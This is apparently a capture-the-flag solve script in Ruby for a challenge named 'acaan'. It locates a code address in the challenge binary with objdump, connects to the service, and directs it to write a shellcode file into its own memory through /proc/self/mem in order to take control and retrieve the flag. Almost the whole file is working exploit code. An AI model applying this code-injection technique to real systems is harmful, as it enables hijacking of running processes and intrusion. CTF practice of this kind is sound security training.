require_relative './libronsolve'
require 'socket'

HOST, PORT = get_host_port()

EXE = ::File.join(__dir__, '..', 'challenge', 'src', 'acaan')

# Find a good place to target - we're choosing this line, +5 (so the line after):
# 4014f8:       e8 93 fb ff ff          call   401090 <close@plt>
unless `objdump -D #{ EXE } | grep 'call.*close@plt' | tail -n1` =~ /^ *([0-9a-fA-F]*)/
  puts "Couldn't find __stack_chk_fail call!"
  exit 1
end

TARGET_ADDRESS = Regexp.last_match(0).to_i(16) + 5
puts 'Target address: %x' % TARGET_ADDRESS

s = TCPSocket.new(HOST, PORT)

puts s.readpartial(1024)
s.puts('/proc/self/mem')
sleep(0.5)
puts s.readpartial(1024)
s.puts(TARGET_ADDRESS.to_i)
sleep(0.5)
puts s.readpartial(1024)
s.puts(File.read(File.join(__dir__, 'shellcode.bin')))
s.puts('.')
s.puts('.')
sleep(0.5)
check_flag(s.read(1024), terminate: true, partial: true)
